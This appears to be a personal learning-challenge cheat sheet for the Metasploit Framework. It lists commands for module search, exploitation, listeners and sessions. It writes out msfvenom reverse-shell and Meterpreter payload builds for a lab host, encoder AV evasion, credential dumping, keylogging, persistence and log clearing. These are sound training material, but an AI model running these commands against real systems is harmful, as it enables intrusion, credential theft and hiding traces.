# Metasploit Framework - Workflow Reference

> Part of the [100 Days of Cybersecurity](../README.md) challenge - Day 025

A practical reference for penetration testers. Every command you'll use regularly, organised by phase.

---

## 🚀 Starting Metasploit

```bash
# Launch (standard)
msfconsole

# Launch quietly (skip banner)
msfconsole -q

# Launch and run a resource script
msfconsole -r setup.rc

# Update the framework and exploit database
sudo msfupdate
```

---

## 🔍 Finding Modules

```bash
# Search by keyword
search vsftpd
search eternalblue
search log4j

# Search by CVE
search cve:2021-44228
search cve:2017-0144

# Search by type and platform
search type:exploit platform:windows
search type:auxiliary name:scanner
search type:post name:gather

# Search by rank (reliability)
search rank:excellent type:exploit platform:linux

# Show full module path in results
search -S vsftpd
```

---

## 📦 Module Types - Quick Reference

```
exploit/    → takes advantage of a vulnerability to get access
auxiliary/  → scanners, fuzzers, brute forcers (no payload)
post/       → run after you have a session (privilege escalation, persistence)
payload/    → code that runs on the target after exploitation
encoder/    → obfuscate payloads to evade AV detection
evasion/    → advanced AV/EDR evasion
nop/        → padding for exploit reliability
```

---

## ⚙️ Module Configuration

```bash
# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor
use exploit/multi/samba/usermap_script
use exploit/windows/smb/ms17_010_eternalblue

# Show all options (required + optional)
show options

# Show advanced options
show advanced

# Show available payloads for this module
show payloads

# Show targets (OS versions the exploit supports)
show targets

# Get full module information
info

# Set required options
set RHOSTS 192.168.56.101        # single target IP
set RHOSTS 192.168.56.1-254      # IP range
set RHOSTS file:/tmp/targets.txt # from file
set RPORT 21
set LHOST 192.168.56.1           # your IP (reverse shells)
set LPORT 4444

# Set global options (persist across modules)
setg LHOST 192.168.56.1
setg LPORT 4444

# Unset an option
unset LHOST

# Verify configuration before running
check
```

---

## 🎯 Payload Selection

```bash
# Show compatible payloads for current exploit
show payloads

# Common payload types:
# ─────────────────────────────────────────────────────────────
# cmd/unix/interact           → simple interactive shell (Unix)
# cmd/unix/reverse            → reverse shell via netcat
# linux/x86/shell_reverse_tcp → Linux reverse TCP shell
# linux/x64/shell_reverse_tcp → Linux 64-bit reverse TCP shell
# linux/x86/meterpreter/reverse_tcp → Linux Meterpreter
# windows/shell_reverse_tcp   → Windows reverse shell
# windows/x64/shell_reverse_tcp → Windows 64-bit reverse shell
# windows/meterpreter/reverse_tcp → Windows Meterpreter
# php/reverse_php             → PHP reverse shell (web apps)
# java/meterpreter/reverse_tcp → Java Meterpreter
# ─────────────────────────────────────────────────────────────

# Set payload
set payload linux/x64/shell_reverse_tcp
set payload windows/meterpreter/reverse_tcp

# Staged vs Stageless:
# linux/x86/shell/reverse_tcp     → staged (/ between shell and reverse)
# linux/x86/shell_reverse_tcp     → stageless (_ between shell and reverse)
# Stageless = self-contained, more reliable across restricted networks
```

---

## ▶️ Running Exploits

```bash
# Run the exploit
run
exploit          # same as run

# Run and automatically background successful sessions
run -j

# Rerun against multiple targets
run -z

# Check if target is vulnerable (some modules support this)
check
```

---

## 📡 Session Management

```bash
# List all active sessions
sessions -l
sessions         # shorthand

# Interact with a session
sessions -i 1
sessions -i -1   # most recent session

# Background current session (from within session)
background
Ctrl+Z

# Kill a session
sessions -k 1
sessions -K      # kill all sessions

# Upgrade a shell to Meterpreter
sessions -u 1

# Run a command on a session without entering it
sessions -c "whoami" -i 1

# Run a module against all sessions
sessions -s post/multi/manage/shell_to_meterpreter
```

---

## 🦎 Meterpreter Commands

```bash
# ── System Info ──────────────────────────
sysinfo              # OS, hostname, architecture
getuid               # current user
getpid               # current process ID
ps                   # list all processes
getsystem            # attempt privilege escalation (Windows)

# ── File System ──────────────────────────
pwd                  # current directory
ls                   # list files
cd /tmp              # change directory
cat /etc/passwd      # read file
upload /local/file /remote/path    # upload to target
download /remote/file /local/path  # download from target
edit /etc/hosts      # edit file with vim

# ── Shell Access ─────────────────────────
shell                # drop to system shell
Ctrl+Z               # background shell, back to meterpreter

# ── Networking ───────────────────────────
ifconfig             # network interfaces
route                # routing table
portfwd add -l 8080 -p 80 -r 10.10.10.10   # port forward
portfwd list         # show port forwards

# ── Pivoting ─────────────────────────────
# Add route to internal network through session
run post/multi/manage/autoroute SUBNET=10.10.10.0 NETMASK=255.255.255.0
route add 10.10.10.0/24 1    # add route through session 1

# ── Credential Gathering ─────────────────
hashdump             # dump /etc/shadow or SAM hashes
run post/linux/gather/hashdump
run post/windows/gather/credentials/credential_collector
run post/multi/gather/env                  # environment variables

# ── Persistence ──────────────────────────
run post/linux/manage/sshkey_persistence   # add SSH key
run post/windows/manage/persistence        # Windows startup persistence

# ── AV Evasion ───────────────────────────
migrate [PID]        # migrate to another process (hide from AV)

# ── Screenshot / Keylogging ──────────────
screenshot           # take screenshot
keyscan_start        # start keylogger
keyscan_dump         # dump keystrokes
keyscan_stop         # stop keylogger

# ── Cleanup ──────────────────────────────
clearev              # clear Windows event logs
timestomp file.txt -m "01/01/2020 00:00:00"  # modify file timestamps
```

---

## 🔧 msfvenom - Standalone Payload Generation

```bash
# List all payloads
msfvenom -l payloads

# List all formats
msfvenom -l formats

# ── Linux Payloads ───────────────────────
# Reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f elf -o shell.elf

# Meterpreter ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f elf -o meterpreter.elf

# ── Windows Payloads ─────────────────────
# Reverse shell EXE
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f exe -o shell.exe

# Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f exe -o meterpreter.exe

# DLL injection
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f dll -o payload.dll

# ── Web Payloads ─────────────────────────
# PHP reverse shell
msfvenom -p php/reverse_php \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.php

# JSP (Java web apps / Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.jsp

# WAR file (Tomcat deployment)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f war -o shell.war

# ── Scripting Payloads ───────────────────
# Python
msfvenom -p cmd/unix/reverse_python \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.sh

# PowerShell
msfvenom -p cmd/windows/powershell_reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -f raw -o shell.ps1

# ── Encoding (Basic AV Evasion) ──────────
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.56.1 LPORT=4444 \
  -e x64/zutto_dekiru -i 5 \
  -f exe -o encoded.exe
```

---

## 🎧 Setting Up a Listener

```bash
# Multi/handler - catches reverse shells
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp    # match your payload
set LHOST 192.168.56.1
set LPORT 4444
run -j                                      # run as background job

# Or use netcat for simple shells
nc -lvnp 4444
```

---

## 📝 Useful Auxiliary Modules

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.0/24
set PORTS 22,80,443,445,3306
run

# SMB version scan
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.0/24
run

# SSH version scan
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.56.0/24
run

# FTP anonymous login check
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.56.0/24
run

# HTTP directory scan
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.56.101
set RPORT 80
run

# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.56.101
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false
run

# Brute force HTTP login
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.56.101
set AUTH_URI /dvwa/login.php
run
```

---

## 💾 Resource Scripts - Automating Common Workflows

Save repeated commands to a `.rc` file and run them automatically:

```bash
# setup.rc - auto-configure listener on startup
cat > /tmp/listener.rc << 'EOF'
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
set ExitOnSession false
run -j
EOF

msfconsole -r /tmp/listener.rc
```

---

## 📊 Metasploit Database (Storing Results)

```bash
# Start PostgreSQL (required for DB features)
sudo service postgresql start
sudo msfdb init

# In msfconsole:
db_status              # check DB connection
workspace              # list workspaces
workspace -a Lab01     # create new workspace
workspace Lab01        # switch to workspace

# Auto-import Nmap results
db_nmap -sV 192.168.56.0/24

# View discovered hosts
hosts
hosts -c address,os_name,purpose

# View discovered services
services
services -p 80,443,22
services -s http

# View credentials gathered
creds

# Export results
db_export -f xml /tmp/msf_results.xml
```

---

## ⚡ One-Liner Quick Reference

```bash
# Everything in one line (scan + exploit)
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.101; run; exit"

# Auto-exploit with DB
msfconsole -q -x "db_nmap -sV 192.168.56.101; vulns"
```

---

## ⚠️ Rules to Never Break

```
1. Only use against systems you own or have written permission to test
2. Always set ExitOnSession false when running multi-handler as a job
3. Document every command - timestamps, module used, output
4. Restore target snapshots after each lab session
5. Never run Metasploit against production systems without a signed SOW
```

---

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*